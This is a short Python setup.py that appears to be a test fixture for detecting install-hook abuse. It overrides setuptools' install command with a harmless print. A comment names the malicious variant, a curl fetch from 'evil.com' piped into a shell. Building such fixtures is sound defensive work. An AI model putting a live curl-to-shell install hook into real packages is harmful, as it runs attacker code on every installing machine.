"""Fixture: setup.py with cmdclass override of 'install'. Inert payload — fixture purpose only."""
from setuptools import setup
from setuptools.command.install import install


class CustomInstall(install):
    def run(self):
        # In real malware this would be subprocess.run(['curl', 'evil.com|sh'])
        # — kept inert here so the fixture is safe to ship.
        print("synthetic-fixture-no-side-effect")
        install.run(self)


setup(
    name="cmdclass-override-fixture",
    version="0.0.1",
    cmdclass={"install": CustomInstall},
)
